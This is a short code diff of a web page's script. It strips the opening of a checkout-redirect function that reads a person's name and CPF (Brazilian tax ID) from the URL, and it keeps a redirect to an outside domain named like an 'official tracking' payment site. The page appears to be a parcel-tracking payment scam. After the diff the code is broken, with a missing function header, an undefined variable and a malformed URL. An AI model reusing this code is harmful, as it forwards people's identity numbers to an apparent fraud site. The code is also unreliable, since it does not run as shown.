@@ -265,16 +265,6 @@
     </script>
 
     <script>
-        function redirectCheckout(event) {
-            event.preventDefault();
-
-            const urlParams = new URLSearchParams(window.location.search);
-            const nome = urlParams.get("nome") ? decodeURIComponent(urlParams.get("nome")) : "";
-            const cpf = urlParams.get("cpf") ? urlParams.get("cpf") : "";
-
-            const currentParams = new URLSearchParams(window.location.search);
-            currentParams.set("name", nome);
-            currentParams.set("document", cpf);
 
             const finalUrl = "http://rastrear-oficial.online/gerando-pagamento/index.html" + currentParams.toString();
             window.location.href = finalUrl;
